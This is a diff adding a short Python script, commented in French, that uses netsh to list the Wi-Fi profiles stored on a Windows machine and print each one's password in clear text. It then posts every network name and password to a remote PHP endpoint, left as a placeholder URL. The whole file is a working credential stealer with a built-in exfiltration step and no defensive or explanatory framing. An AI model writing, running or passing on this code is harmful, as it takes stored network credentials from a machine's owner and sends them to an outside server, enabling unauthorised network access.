@@ -1,0 +1,34 @@
+import requests
+import subprocess
+import re
+import requests
+# URL du script PHP
+url_infos = "your url /infos.php"
+def get_wifi_profiles():
+    result = subprocess.run(["powershell","netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
+    profiles = re.findall(r"\s*:\s(.*)", result.stdout)
+    return profiles
+
+def get_wifi_passwords(profiles):
+    wifi_passwords = {}
+    for profile in profiles:
+        profile_result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],capture_output=True, text=True)
+        wifi_passwords[profile] = profile_result.stdout.strip()
+    return wifi_passwords
+
+def main(): 
+    wifi_profiles = get_wifi_profiles()
+    wifi_passwords = get_wifi_passwords(wifi_profiles)
+    for profile, password in wifi_passwords.items():
+        donnees = {
+            'info1': '__resultat__',
+            'info2': '____________',
+            'info3': '____________',
+            'info4':(f"WiFi Network: {profile}, Password: {password}"),
+            'info5': '____________'
+        }
+        reponse = requests.post(url_infos, data=donnees)
+
+
+if __name__ == "__main__":
+    main()
